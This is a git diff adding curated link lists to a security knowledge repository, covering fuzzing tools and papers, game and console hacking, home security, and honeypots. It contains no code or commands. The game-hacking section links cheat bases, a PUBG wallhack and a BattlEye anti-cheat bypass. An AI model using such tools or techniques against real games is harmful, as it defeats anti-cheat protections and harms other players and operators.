+* [GitHub for Bug Bounty Hunters](https://gist.github.com/EdOverflow/922549f610b258f459b219a32f92d10b)
+* [Secure Code Review - OpenSecurityTraining.info](http://opensecuritytraining.info/SecureCodeReview.html)
+* [High-Level Approaches for Finding Vulnerabilities](http://jackson.thuraisamy.me/finding-vulnerabilities.html)
+
+### Writeups
+
+* [From Fuzzing to 0day.](http://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/)
+* [Faster Fuzzing with Python](https://labs.mwrinfosecurity.com/blog/2014/12/10/faster-fuzzing-with-python/)
+* [Walkthrough of setting up CERT’s FOE fuzzer and fuzzing irfanview](http://www.singlehop.com/blog/lets-fuzz-irfanview/)
+* [How to fuzz a server with American Fuzzy Lop](https://www.fastly.com/blog/how-fuzz-server-american-fuzzy-lop)
+* [Fuzzing for MS15-010](http://blog.beyondtrust.com/fuzzing-for-ms15-010)
+
+  * Is what it says on the tin.
+
+* [Advice From A Researcher: Hunting XXE For Fun and Profit](https://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
+* [Running Windows 64-bit in QEMU Emulation Mode](https://www.invincealabs.com/blog/2016/07/running-windows-64bit-qemu/)
+* [There's a lot of vulnerable OS X applications out there](https://vulnsec.com/2016/osx-apps-vulnerabilities/)
+* [Binary SMS - The old backdoor to your new thing](https://www.contextis.com/resources/blog/binary-sms-old-backdoor-your-new-thing/)
+* [Hacking Virtual Appliances - DerbyconV](https://www.irongeek.com/i.php?page=videos/derbycon5/fix-me08-hacking-virtual-appliances-jeremy-brown)
+
+  * Virtual Appliances have become very prevalent these days as virtualization
+    is ubiquitous and hypervisors commonplace. More and more of the major
+    vendors are providing literally virtual clones for many of their once
+    physical-only products. Like IoT and the CAN bus, it's early in the game and
+    vendors are late as usual. One thing that it catching these vendors off
+    guard is the huge additional attack surface, ripe with vulnerabilities,
+    added in the process. Also, many vendors see software appliances as an
+    opportunity for the customer to easily evaluate the product before buying
+    the physical one, making these editions more accessible and debuggable by
+    utilizing features of the platform on which it runs. During this talk, I
+    will provide real case studies for various vulnerabilities created by
+    mistakes that many of the major players made when shipping their appliances.
+    You'll learn how to find these bugs yourself and how the vendors went about
+    fixing them, if at all. By the end of this talk, you should have a firm
+    grasp of how one goes about getting remotes on these appliances.
+
+* [Fuzzing for MS15-010](http://blog.beyondtrust.com/fuzzing-for-ms15-010)
+
+  * This past Patch Tuesday Microsoft released MS15MS15-010: Vulnerabilities in
+    Windows Kernel-Mode Driver Could Allow Remote Code Execution. This patch
+    addressed multiple privately reported vulnerabilities in win32k.sys and one
+    publicly disclosed vulnerability in cng.sys. This post goes through
+    identifying the patched vulnerability.
+
+### Papers
+
+* [Smart COM Fuzzing - Auditing IE Sandbox Bypass in COM Objects• Xiaoning Li • Haifei Li](https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/Smart_COM_Fuzzing_Auditing_IE_Sandbox_Bypass_in_COM_Objects_final.pdf)
+* [Applying Taint Analysis and Theorem Proving to Exploit Development - Sean Heelan - RECON2010](http://static1.squarespace.com/static/507c09ede4b0954f51d59c75/t/508eb764e4b047ba54db4999/1351530340153/applying_taint_analysis_and_theorem_proving_to_xdev.pdf)
+* [All You Ever Wanted to Know About Dynamic Taint Analysis and Forward Symbolic Execution (but might have been afraid to ask)](http://users.ece.cmu.edu/~ejschwar/papers/oakland10.pdf)
+
+  * Abstract —Dynamic taint analysis and forward symbolic execution are quickly
+    becoming staple techniques in security analyses. Example applications of
+    dynamic taint analysis and forward symbolic execution include malware
+    analysis, input filter generation, test case generation, and vulnerability
+    dis- covery. Despite the widespread usage of these two techniques, there has
+    been little effort to formally define the algorithms and summarize the
+    critical issues that arise when these techniques are used in typical
+    security contexts. The contributions of this paper are two-fold. First, we
+    precisely describe the algorithms for dynamic taint analysis and forward
+    symbolic execution as extensions to the run-time se- mantics of a general
+    language. Second, we highlight important implementation choices, common
+    pitfalls, and considerations when using these techniques in a security
+    context.
+
+* [A Critical Review of Dynamic Taint Analysis and Forward Symbolic Execution](https://asankhaya.github.io/pdf/)
+
+  * In this note , we describe a critical review of the paper titled “All you
+    wanted to know about dynamics taint analysis and forward symbolic execution
+    (but may have been afraid to ask)” [1] . We analyze the paper using Paul
+    Elder critical thinking framework [2] . We sta rt with a summary of the
+    paper and motivation behind the research work described in [1]. Then we
+    evaluate the study with respect to the universal intellectual standards of
+    [2]. We find that the paper provides a good survey of the existing
+    techniques and algorithms used for security analysis. It explains them using
+    the theoretical framework of operational runtime semantics. However in some
+    places t he paper can do a better job in highlighting what new insights or
+    heuristics can be gained from a runtime seman tics formulation. The paper
+    fails to convince the reader how such an intricate understanding of
+    operational semantics of a new generic language SimpIL helps in advancing
+    the state of the art in dynamic taint analysis and forward symbolic
+    execution. We also found that the Paul Elder critical thinking framework is
+    a useful technique to reason about and analyze research papers.
+
+* [Effective Bug Discovery](http://uninformed.org/?v=all&a=27&t=sumry)
+
+  * Sophisticated methods are currently being developed and implemented for
+    mitigating the risk of exploitable bugs. The process of researching and
+    discovering vulnerabilities in modern code will require changes to
+    accommodate the shift in vulnerability mitigations. Code coverage analysis
+    implemented in conjunction with fuzz testing reveals faults within a binary
+    file that would have otherwise remained undiscovered by either method alone.
+    This paper suggests a research method for more effective runtime binary
+    analysis using the aforementioned strategy. This study presents empirical
+    evidence that despite the fact that bug detection will become increasingly
+    difficult in the future, analysis techniques have an opportunity to evolve
+    intelligently.
+
+* [TAJ: Effective Taint Analysis of Web Applications - Java Webapps](http://manu.sridharan.net/files/pldi153-tripp.pdf)
+
+  * Taint analysis, a form of information-flow analysis, establishes whether
+    values from untrusted methods and parameters may flow into
+    security-sensitive operations. Taint analysis can detect many common
+    vulnerabilities in Web applications, and so has attracted much attention
+    from both the research community and industry. However, most static
+    taint-analysis tools do not address criti- cal requirements for an
+    industrial-strength tool. Specifically, an industrial-strength tool must
+    scale to large industrial Web applica- tions, model essential
+    Web-application code artifacts, and generate consumable reports for a wide
+    range of attack vectors. We have designed and implemented a static Taint
+    Analysis for Java (TAJ) that meets the requirements of industry-level
+    applica- tions. TAJ can analyze applications of virtually any size, as it
+    em- ploys a set of techniques designed to produce useful answers given
+    limited time and space. TAJ addresses a wide variety of attack vec- tors,
+    with techniques to handle reflective calls, flow through con- tainers,
+    nested taint, and issues in generating useful reports. This paper provides a
+    description of the algorithms comprising TAJ, evaluates TAJ against
+    production-level benchmarks, and compares it with alternative solutions.
+
+* [Fuzzing the Phone in your Phone](https://www.blackhat.com/presentations/bh-usa-09/MILLER/BHUSA09-Miller-FuzzingPhone-PAPER.pdf)
+
+### Talks/Videos
+
+### Bug Hunting
+
+* [Browser Bug Hunting and Mobile](http://slides.com/revskills/fzbrowsers#/)
+* [Upping Your Bug Hunting Skills Using Symbolic Virtual Machines by Anto - x33fcon](https://www.youtube.com/watch?v=IPSZxGaLlyk)
+* [The Best of Bug Finding - Duo Tech Talk (Charlie Miller)](https://www.youtube.com/watch?v=1M1EOzulQsw)
+
+  * I look at how security vulnerabilities are found (or missed) and some of my
+    favorite bugs and exploits I’ve come across in my career.
+
+#### Fuzzing
+
+* [Implementing an USB Host Driver Fuzzer - Daniel Mende - Troopers14](https://www.youtube.com/watch?v=h777lF6xjs4)
+* [The Power Of Pair: One Template That Reveals 100+ Uaf Ie Vulnerabilities - BlackhatEU14](http://www.securitytube.net/video/12924?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SecurityTube+%28SecurityTube.Net%29)
+* [What Happens In Windows 7 Stays In Windows 7 - Marion Marschalek & Joseph Moti - Troopers14](https://www.youtube.com/watch?v=s_7Cy2w2dCw)
+
+  * Diffing libs in Win7 compared to Win8 to id vuln dlls.
+
+* [DiffRay](https://github.com/pinkflawd/DiffRay)
+
+  * Tool for diffing Win7 & Win8 Libraries based on textfile outputs from IDA
+    Pro.
+
+* [Mining for Bugs with Graph Database Queries [31c3]](https://www.youtube.com/watch?v=291hpUE5-3g)
+* [Starting out with Joern](http://tsyrklevich.net/2015/03/28/starting-out-with-joern/)
+* [Fuzz Smarter, Not Harder (An Afl-Fuzz Primer) BSides-SF 2016](http://www.securitytube.net/video/15372)
+* [File Format Fuzzing in Android](https://deepsec.net/docs/Slides/2015/File_Format_Fuzzing_in_Android_-Alexandru_Blanda.pdf)
+* [Fuzzing Object s d’ART Digging Into the New Android L Runtime Internals](http://census-labs.com/media/Fuzzing_Objects_d_ART_hitbsecconf2015ams_WP.pdf)
+* [Browser bug hunting - Memoirs of a last man standing, Atte Kettunen](https://vimeo.com/109380793)
+* [Unusual bugs - 23C3](https://www.youtube.com/watch?v=qj79Qdmw0Pk)
+
+  * In this presentation I'll present a series of unusual security bugs. Things
+    that I've ran into at some point and went "There's gotta be some security
+    consequence here". None of these are really a secret, and most of them are
+    even documented somewhere. But apparently most people don't seem to know
+    about them. What you'll see in this presentation is a list of bugs and then
+    some explanation of how these could be exploited somehow. Some of the things
+    I'll be talking about are (recursive) stack overflow, NULL pointer
+    dereferences, regular expressions and more.
+
+* [ClusterFuzz](http://nullcon.net/website/archives/ppt/goa-15/analyzing-chrome-crash-reports-at-scale-by-abhishek-arya.pdf)
+* [Introduction to USB and Fuzzing DEFCON23 Matt DuHarte](https://www.youtube.com/watch?v=KWOTXypBt4E)
+* [Practical File Format Fuzzing](http://www.irongeek.com/i.php?page=videos/derbycon3/3301-practical-file-format-fuzzing-jared-allar)
+
+  * File format fuzzing has been very fruitful at discovering exploitable
+    vulnerabilities. Adversaries take advantage of these vulnerabilities to
+    conduct spear-phishing attacks. This talk will cover the basics of file
+    format fuzzing and show you how to use CERT’s fuzzing frameworks to
+    discovery vulnerabilities in file parsers.
+
+* [Improving security with Fuzzing and Sanitizers](https://media.ccc.de/v/SHA2017-148-improving_security_with_fuzzing_and_sanitizers)
+
+  * A bug in Gstreamer could be used to own a Linux Desktop system. TCPDump
+    released a security update fixing 42 CVEs. We have far too many security
+    critical bugs in the free and open source software stack. But we have
+    powerful tools to find them - we just have to use them.
+
+* [Introduction to Custom Protocol Fuzzing](https://www.youtube.com/watch?v=ieatSJ7ViBw)
+* [0-day streams: pdfcrack](https://www.youtube.com/watch?v=8VLNPIIgKbQ&app=desktop)
+
+### Books
+
+* [_THE_ Book on fuzzing](http://fuzzing.org/)
+
+### Training
+
+* [Modern fuzzing of C/C++ Projects - Slides](https://docs.google.com/presentation/d/1pbbXRL7HaNSjyCHWgGkbpNotJuiC4O7L_PDZoGqDf5Q/edit#slide=id.p4)
+
+* [libfuzzer-workshop](https://github.com/Dor1s/libfuzzer-workshop)
+
+  * Materials of "Modern fuzzing of C/C++ Projects" workshop.
+
+### Tools
+
+#### Non OS Specific
+
+* [honggfuzz](https://github.com/google/honggfuzz)
+
+  * Security oriented fuzzer with powerful analysis options. Supports
+    evolutionary, feedback-driven fuzzing based on code coverage (sw and hw)
+    http://google.github.io/honggfuzz/
+
+* [Grinder - Fuzzer](https://github.com/stephenfewer/grinder)
+
+  * Grinder is a system to automate the fuzzing of web browsers and the
+    management of a large number of crashes. Grinder Nodes provide an automated
+    way to fuzz a browser, and generate useful crash information (such as call
+    stacks with symbol information as well as logging information which can be
+    used to generate reproducible test cases at a later stage). A Grinder Server
+    provides a central location to collate crashes and, through a web interface,
+    allows multiple users to login and manage all the crashes being generated by
+    all of the Grinder Nodes.
+
+* [USB Fuzzing Basics: From fuzzing to bug reporting](http://blog.quarkslab.com/usb-fuzzing-basics-from-fuzzing-to-bug-reporting.html)
+* [libFuzzer](http://llvm.org/docs/LibFuzzer.html)
+
+  * library for in-process evolutionary fuzzing of other libraries.
+
+* [crashwalk](https://github.com/bnagy/crashwalk)
+
+  * Bucket and triage on-disk crashes. OSX and Linux.(automated triaging of
+    AFL-based crashes)
+
+* [CERT’s Failure Observation Engine (FOE)](https://www.cert.org/vulnerability-analysis/tools/foe.cfm)
+
+  * The CERT Failure Observation Engine (FOE) is a software testing tool that
+    finds defects in applications that run on the Windows platform. FOE performs
+    mutational fuzzing on software that consumes file input. (Mutational fuzzing
+    is the act of taking well-formed input data and corrupting it in various
+    ways looking for cases that cause crashes.) The FOE automatically collects
+    test cases that cause software to crash in unique ways, as well as debugging
+    information associated with the crashes. The goal of FOE is to minimize the
+    effort required for software vendors and security researchers to efficiently
+    discover and analyze security vulnerabilities found via fuzzing.
+
+* [Zulu Fuzzer](https://github.com/nccgroup/Zulu)
+
+  * The Zulu fuzzer
+
+* [Radamsa](https://code.google.com/p/ouspg/wiki/Radamsa)
+
+  * Radamsa is a test case generator for robustness testing, aka a fuzzer. It
+    can be used to test how well a program can stand malformed and potentially
+    malicious inputs. It operates based on given sample inputs and thus requires
+    minimal effort to set up. The main selling points of radamsa are that it is
+    easy to use, contains several old and new fuzzing algorithms, is easy to
+    script from command line and has already been used to find a slew of bugs in
+    programs that actually matter.
+
+* [browserfuzz](https://bitbucket.org/blackaura/browserfuzz)
+
+  * A very simple browser fuzzer based on tornado.
+
+* [sandbox-attacksurface-analysis-tools](https://github.com/google/sandbox-attacksurface-analysis-tools)
+
+  * This is a small suite of tools to test various properties of sandboxes on
+    Windows. Many of the checking tools take a -p flag which is used to specify
+    the PID of a sandboxed process. The tool will impersonate the token of that
+    process and determine what access is allowed from that location. Also it's
+    recommended to run these tools as an administrator or local system to ensure
+    the system can be appropriately enumerated.
+
+* [Kitty](https://github.com/cisco-sas/kitty)
+
+  * Fuzzing framework written in python(Not a fuzzer)
+
+* [IDA Pro](https://www.hex-rays.com/products/ida/index.shtml)
+* [binnavi](https://github.com/google/binnavi)
+
+  * Binary analysis IDE, annotates control flow graphs and call graphs of
+    disassembled code.
+
+* [Capstone](https://github.com/aquynh/capstone)
+
+  * Capstone is a lightweight multi-platform, multi-architecture disassembly
+    framework.
+
+* [KernelFuzzer](https://github.com/mwrlabs/KernelFuzzer)
+
+  * Cross Platform Kernel Fuzzer Framework.
+
+* [honggfuzz](http://google.github.io/honggfuzz/)
+
+  * A general-purpose, easy-to-use fuzzer with interesting analysis options.
+
+* [Hodor Fuzzer](https://github.com/nccgroup/hodor)
+
+  * Yet Another general purpose fuzzer.
+
+* [libFuzzer](http://libfuzzer.info)
+
+  * In-process, coverage-guided, evolutionary fuzzing engine for targets written
+    in C/C++.
+
+* [Fuzzapi](https://github.com/lalithr95/fuzzapi)
+
+  * Fuzzapi is rails application which uses API_Fuzzer and provide UI solution
+    for gem.
+
+* [ansvif](https://oxagast.github.io/ansvif/)
+
+  * An advanced cross platform fuzzing framework designed to find
+    vulnerabilities in C/C++ code.
+
+* [Nightmare](https://github.com/joxeankoret/nightmare)
+
+  * A distributed fuzzing testing suite with web administration, supports
+    fuzzing using network protocols.
+
+* [rage_fuzzer](https://github.com/deanjerkovich/rage_fuzzer)
+
+  * A dumb protocol-unaware packet fuzzer/replayer.
+
+* [libfuzzer-gv](https://github.com/guidovranken/libfuzzer-gv)
+
+  * enhanced fork of libFuzzer
+
+* [libFuzzer-gv: new techniques for dramatically faster fuzzing](https://guidovranken.wordpress.com/2017/07/08/libfuzzer-gv-new-techniques-for-dramatically-faster-fuzzing/)
+
+#### Windows Specific
+
+* [WinAFL](https://github.com/ivanfratric/winafl)
+
+  * A fork of AFL for fuzzing Windows binaries
+
+* [!exploitable Crash Analyzer](https://msecdbg.codeplex.com/)
+
+  * !exploitable (pronounced “bang exploitable”) is a Windows debugging
+    extension (Windbg) that provides automated crash analysis and security risk
+    assessment. The tool first creates hashes to determine the uniqueness of a
+    crash and then assigns an exploitability rating to the crash: Exploitable,
+    Probably Exploitable, Probably Not Exploitable, or Unknown. There is more
+    detailed information about the tool in the following .pptx file or at
+    http://www.microsoft.com/security/msec. Additonally, see the blog post at
+    http://blogs.technet.com/srd/archive/2009/04/08/the-history-of-the-exploitable-crash-analyzer.aspx,
+    or watch the video at
+    http://channel9.msdn.com/posts/PDCNews/Bang-Exploitable-Security-Analyzer/.
+
+#### Linux Specific
+
+* [American Fuzzy Lop AFL](http://lcamtuf.coredump.cx/afl/)
+
+  * American fuzzy lop is a security-oriented fuzzer that employs a novel type
+    of compile-time instrumentation and genetic algorithms to automatically
+    discover clean, interesting test cases that trigger new internal states in
+    the targeted binary. This substantially improves the functional coverage for
+    the fuzzed code. The compact synthesized corpora produced by the tool are
+    also useful for seeding other, more labor- or resource-intensive testing
+    regimes down the road.
+  * It was made by lcamtuf. What more do you need?
+
+* [afl-dyninst ; AFL Fuzzing blackbox binaries](https://github.com/vrtadmin/moflow/tree/master/afl-dyninst)
+
+  * American Fuzzy Lop + Dyninst == AFL Fuzzing blackbox binaries The tool has
+    two parts. The instrumentation tool and the instrumentation library.
+    Instrumentation library has an initialization callback and basic block
+    callback functions which are designed to emulate what AFL is doing with
+    afl-gcc/afl-g++/afl-as. Instrumentation tool (afl-dyninst) instruments the
+    supplied binary by inserting callbacks for each basic block and an
+    initialization callback either at _init or at specified entry point.
+
+* [syzkaller - linux syscall fuzzer](https://github.com/google/syzkaller)
+
+  * An unsupervised, coverage-guided Linux syscall fuzzer. It is meant to be
+    used with KASAN (CONFIG_KASAN=y), KTSAN (CONFIG_KTSAN=y), or KUBSAN.
+
+* [Google - AddressSanitizer, ThreadSanitizer, MemorySanitizer, LeaksSanitizer](https://github.com/google/sanitizers)
+
+  * This project is the home for Sanitizers: AddressSanitizer, MemorySanitizer,
+    ThreadSanitizer, LeakSanitizer. The actual code resides in the LLVM
+    repository. Here we keep extended documentation, bugs and some helper code.
+
+#### Android Specific
+
+* [MFFA - Media Fuzzing Framework for Android](https://github.com/fuzzing/MFFA)
+
+#### Peach Fuzzer
+
+* [Peach Documentation](http://old.peachfuzzer.com/Introduction.html)
+* [Creating Custom Peach Fuzzer Publishers](http://blog.opensecurityresearch.com/2014/01/creating-custom-peach-fuzzer-publishers.html)
+* [Creating Custom Peach Fuzzer Publishers](http://blog.opensecurityresearch.com/2014/01/creating-custom-peach-fuzzer-publishers.html)
+* [Code](https://github.com/OpenSecurityResearch/CustomPeachPublisher)
+
+* Fuzzing with Peach tutorial
+  * [Part 1](http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/)
+  * [Part 2](http://www.flinkd.org/2011/11/fuzzing-with-peach-part-2-fixups-2/)
+  * [Fuzzing Vulnserver with Peach 3](http://rockfishsec.blogspot.com/2014/01/fuzzing-vulnserver-with-peach-3.html)
+
+### Taint Analysis
+
+* [PANDA ( Platform for Architecture-Neutral Dynamic Analysis )](https://github.com/moyix/panda)
+* [QIRA (QEMU Interactive Runtime Analyser)](http://qira.me/)
+
+### Misc
+
+* [Good slides on fuzzing](https://courses.cs.washington.edu/courses/cse484/14au/slides/Section8.pdf)
+* [USB Fuzzing Basics from fuzzing to Bug Reporting](http://blog.quarkslab.com/usb-fuzzing-basics-from-fuzzing-to-bug-reporting.html)
diff --git a/source/Game-Hacking.md b/source/Game-Hacking.md
new file mode 100644
index 0000000..4b70d4e
--- /dev/null
+++ b/source/Game-Hacking.md
@@ -0,0 +1,176 @@
+## Game Hacking
+
+### TOC
+
+* [General](#general)
+* [Writeups](#writeups)
+* [Console Hacking](#console)
+* [Reverse Engineering Games](#re)
+* [Talks & Presentations](#talks)
+* [Tools](#tools)
+
+#### Sort
+
+* [OwnedCore](http://www.ownedcore.com/forums/)
+
+### General
+
+* [Introduction to Server Side Emulation - Corillian - tuts4you](https://tuts4you.com/download.php?view.2758)
+* [The Ultimate Online Game Hacking Resource](https://github.com/dsasmblr/hacking-online-games)
+
+  * From dissecting game clients to cracking network packet encryption, this is
+    a go-to reference for those interested in the topic of hacking online games.
+
+#### Writeups
+
+* [How do emulators work and how are they written?](https://stackoverflow.com/questions/448673/how-do-emulators-work-and-how-are-they-written)
+* [Reverse Engineering Strike Commander](http://fabiensanglard.net/reverse_engineering_strike_commander/index.php)
+* [Remote Code Execution In Source Games](https://oneupsecurity.com/research/remote-code-execution-in-source-games?t=r)
+* [Gotta catch-em-all worldwide - Pokemon GO GPS spoofing](https://insinuator.net/2016/07/gotta-catch-em-all-worldwide-or-how-to-spoof-gps-to-cheat-at-pokemon-go/)
+* [Creating a Packet Logger for Dragomon Hunter](https://0xbaadf00dsec.blogspot.com/2016/01/reverse-engineering-online-games.html)
+* [Hack the Vote CTF "The Wall" Solution](https://zerosum0x0.blogspot.com/2016/11/hack-vote-wall-solution.html)
+* [How to hack an MMO - Raph Koster - 2008](https://www.raphkoster.com/2008/04/17/how-to-hack-an-mmo/)
+
+### Console Hacking
+
+#### Nintendo Gameboy
+
+* [Reverse engineering a Gameboy ROM with radare2](https://www.megabeets.net/reverse-engineering-a-gameboy-rom-with-radare2/)
+
+#### Nintendo 3DS
+
+* [Keyshuffling Attack for Persistent Early Code Execution in the Nintendo 3DS Secure Bootchain](https://github.com/Plailect/keyshuffling)
+
+  * We demonstrate an attack on the secure bootchain of the Nintendo 3DS in
+    order to gain early code execution. The attack utilizes the block shuffling
+    vulnerability of the ECB cipher mode to rearrange keys in the Nintendo 3DS's
+    encrypted keystore. Because the shuffled keys will deterministically decrypt
+    the encrypted firmware binary to incorrect plaintext data and execute it,
+    and because the device's memory contents are kept between hard reboots, it
+    is possible to reliably reach a branching instruction to a payload in
+    memory. This payload, due to its execution by a privileged processor and its
+    early execution, is able to extract the hash of hardware secrets necessary
+    to decrypt the device's encrypted keystore and set up a persistant exploit
+    of the system.
+
+* [ARM9Loader Technical Details - GBAtemp](https://gbatemp.net/threads/arm9loader-technical-details-and-discussion.408537/)
+* [Throwback: K9Lhax by Bruteforce](http://douevenknow.us/post/151129092928/throwback-k9lhax-by-bruteforce)
+
+#### Nintendo Wii
+
+* [wiihacks forum](http://www.wiihacks.com/)
+* [WiiHacks](https://www.reddit.com/r/WiiHacks/)
+
+#### PSP / PS Vita
+
+* [Hacking the PS Vita](http://yifan.lu/2015/06/21/hacking-the-ps-vita/)
+* [ Playstation Portable Cracking [24c3]](https://www.youtube.com/watch?v=TgzxyO2QO1M)
+
+### PC Games
+
+* [TruePlay - msdn](<https://msdn.microsoft.com/en-us/library/windows/desktop/mt808781(v=vs.85).aspx>)
+* [Valve Anti-Cheat Untrusted Bans (VAC) CSGO](http://dev.cra0kalo.com/?p=521)
+* [Hacking the Source Engine](http://vallentinsource.com/hacking-source-engine)
+* [How ESEA detects cheat software in its online gaming league - Let's get physical!](http://everdox.blogspot.com/2015/02/how-esea-detects-cheat-software-in-its.html)
+
+  * Before we dig in, this post should not be construed as an attack on ESEA,
+    anti-cheat software, or fair gaming in general. It is simply an analysis
+    thereof, detailing what the ESEA driver does on your machine. Although
+    analysis will make attack vectors clear and obvious, no code or detailed
+    explanation of how to leverage these points will be given.
+
+* [Inside Blizzard: Battle.net](http://uninformed.org/?v=all&a=8&t=sumry)
+
+  * This paper intends to describe a variety of the problems Blizzard
+    Entertainment has encountered from a practical standpoint through their
+    implementation of the large-scale online game matchmaking and chat service,
+    Battle.net. The paper provides some background historical information into
+    the design and purpose of Battle.net and continues on to discuss a variety
+    of flaws that have been observed in the implementation of the system.
+    Readers should come away with a better understanding of problems that can be
+    easily introduced in designing a matchmaking/chat system to operate on such
+    a large scale in addition to some of the serious security-related
+    consequences of not performing proper parameter validation of untrusted
+    clients.
+
+* [An Objective Analysis of the Lockdown Protection System for Battle.net](http://uninformed.org/?v=all&a=40&t=sumry)
+
+  * Near the end of 2006, Blizzard deployed the first major update to the
+    version check and client software authentication system used to verify the
+    authenticity of clients connecting to Battle.net using the binary game
+    client protocol. This system had been in use since just after the release of
+    the original Diablo game and the public launch of Battle.net. The new
+    authentication module (Lockdown) introduced a variety of mechanisms designed
+    to raise the bar with respect to spoofing a game client when logging on to
+    Battle.net. In addition, the new authentication module also introduced
+    run-time integrity checks of client binaries in memory. This is meant to
+    provide simple detection of many client modifications (often labeled
+    "hacks") that patch game code in-memory in order to modify game behavior.
+    The Lockdown authentication module also introduced some anti-debugging
+    techniques that are designed to make it more difficult to reverse engineer
+    the module. In addition, several checks that are designed to make it
+    difficult to simply load and run the Blizzard Lockdown module from the
+    context of an unauthorized, non-Blizzard-game process. After all, if an
+    attacker can simply load and run the Lockdown module in his or her own
+    process, it becomes trivially easy to spoof the game client logon process,
+    or to allow a modified game client to log on to Battle.net successfully.
+    However, like any protection mechanism, the new Lockdown module is not
+    without its flaws, some of which are discussed in detail in this paper.
+
+### RE
+
+### Talks & Presentations
+
+* [+1,000,000 -0: Cloning a Game Using Game Hacking and Terabytes of Data](https://github.com/nickcano/gamehackingpres2016)
+
+  * In this talk, I'll provide a window into the warchest my team used to
+    generate over a million lines of code. In particular, we created and used
+    game hacks to process data from tens of millions of hours of in-game data
+    and use the results to generate copies of a game's map, monsters, quests,
+    items, spells, non-playable characters, and more. We also used a wiki
+    crawler to obtain a large amount of data, generate additional code, and
+    guide our cheat scripts in what to look for, clarify, and ignore. After
+    explaining our end-game vision, I'll dive deep into the architecture of the
+    game client, server and protocol. Once that's out of the way, I'll talk
+    about the different types of hacks we used, how they work, and what data
+    they were able to obtain. Once that's out of the way, I'll round out the
+    story by explaining exactly what type of data we gathered and what parts of
+    our toolkit we used to gather it.
+
+* [The Multibillion Dollar Industry That's Ignored](http://www.irongeek.com/i.php?page=videos/derbycon4/t204-the-multibillion-dollar-industry-thats-ignored-jason-montgomery-and-ryan-sevey)
+* [Creating A Kewl And Simple Cheating Platform On Android - DeepSec2014](http://www.securitytube.net/video/12547?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SecurityTube+%28SecurityTube.Net%29)
+* [DEFCON 17: Fragging Game Servers - Bruce Potter](https://www.youtube.com/watch?v=SooVvF9qO_k&app=desktop)
+
+### Tools
+
+* [Pince](https://github.com/korcankaraokcu/PINCE)
+
+  * PINCE is a gdb front-end/reverse engineering tool focused on games, but it
+    can be used for any reverse-engineering related stuff. PINCE is an
+    abbreviation for "PINCE is not Cheat Engine". PINCE's GUI is heavily
+    "inspired(;D)" by Cheat Engine.
+
+* [ugtrain](https://github.com/ugtrain/ugtrain)
+
+  * Universal Elite Game Trainer for CLI(linux game trainer)
+
+* [CSGOSimple](https://github.com/MarkHC/CSGOSimple)
+
+  * A simple base for internal Counter-Strike: Global Offensive cheats.
+
+* [NoEye](https://github.com/Schnocker/NoEye)
+
+  * An usermode BE Rootkit Bypass
+
+* [PubgPrivXcode85](https://github.com/TonyZesto/PubgPrivXcode85)
+
+  * Simple chams wallhack for Player Unknowns Battlegrounds using a
+    D3D11DrawIndexed hook
+
+* [PortAIO-Loader](https://github.com/PirateEmpire/PortAIO-Loader)
+
+### Games meant to be Hacked
+
+* [PwnAdventureZ](https://github.com/Vector35/PwnAdventureZ)
+
+  * NES zombie survival game made to be hacked
diff --git a/Draft/Gamma_group_hack_writeup.txt b/source/Gamma_group_hack_writeup.txt
old mode 100755
new mode 100644
similarity index 100%
rename from Draft/Gamma_group_hack_writeup.txt
rename to source/Gamma_group_hack_writeup.txt
diff --git a/Draft/Hacking Team Writeup.md b/source/Hacking-Team-Writeup.md
old mode 100755
new mode 100644
similarity index 99%
rename from Draft/Hacking Team Writeup.md
rename to source/Hacking-Team-Writeup.md
index ccbe4a4..c841b24
--- a/Draft/Hacking Team Writeup.md	
+++ b/source/Hacking-Team-Writeup.md
@@ -1,3 +1,4 @@
+# Hacking Team Write-up
 
                 _   _            _      ____             _    _ 
                | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
diff --git a/source/Home-Security.md b/source/Home-Security.md
new file mode 100644
index 0000000..607c095
--- /dev/null
+++ b/source/Home-Security.md
@@ -0,0 +1,5 @@
+## Home Security & Defense
+
+* [Home Alone with localhost - Automating Home Defense - Chris Littlebury - Defcon22](https://www.youtube.com/watch?v=9Tbft190x3Q)
+
+* [Physical Home Security Options - DiabloHorn](https://diablohorn.wordpress.com/2014/07/13/physical-home-security-options/#more-984)
diff --git a/source/Honeypots.md b/source/Honeypots.md
new file mode 100644
index 0000000..666bef3
--- /dev/null
+++ b/source/Honeypots.md
@@ -0,0 +1,297 @@
+## Honeypots
+
+### TOC
+
+* Cull
+* [General](#general)
+* [Honeypots/nets](#honey)
+* [Presentations](#talks)
+* [Tools](#tools)
+* [Write-ups](#writeup)
+* [Papers](#papers)
+
+### Cull
+
+* http://www.cuckoosandbox.org/
+* http://highaltitudehacks.com/2013/06/15/ghost-usb-honeypot-part-2-installing-and-running-the-honeypot/
+* [Honeypot Farming: Setup Modern Honey Network](https://medium.com/@theroxyd/honeypot-farming-setup-mhn-f07d241fcac6)
+* [honeyLambda](https://github.com/0x4D31/honeyLambda)
+
+  * a simple, serverless application designed to create and monitor URL
+    {honey}tokens, on top of AWS Lambda and Amazon API Gateway
+
+* [Masarah Paquet-Clouston & Olivier Bilodeau - Attacking Linux Moose Unraveled an Ego Market](https://www.youtube.com/watch?v=8c8C5cHbRU0&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=2)
+
+### General
+
+* [Honeypots - ShadowServer](https://www.shadowserver.org/wiki/pmwiki.php/Information/Honeypots)
+* [Honeypot Computing - Wikipedia](https://en.wikipedia.org/wiki/Honeypot_%28computing%29)
+
+##### Types:
+
+```
+* Zero
+* Low
+* Medium
+* High
+* HoneyData - Strings, shares/drives, etc.
+```
+
+### Honeypots/nets
+
+* [Modern Honey Network(MHN)](https://threatstream.github.io/mhn/)
+
+  * From the secure deployment to the aggregation of thousands of events MHN
+    provides enteprise grade management of the most current open source honeypot
+    software. MHN is completely free open source software which supports
+    external and internal honeypot deployments at a large and distributed scale.
+    MHN uses the HPFeeds standard and low-interaction honeypots to keep
+    effectiveness and security at enterprise grade levels. MHN provides full
+    REST API out of the box and we are making CEF and STIX support available now
+    for direct SIEM integration through our Commercial platform Optic.
+
+* [Beeswarm](http://www.beeswarm-ids.org/)
+
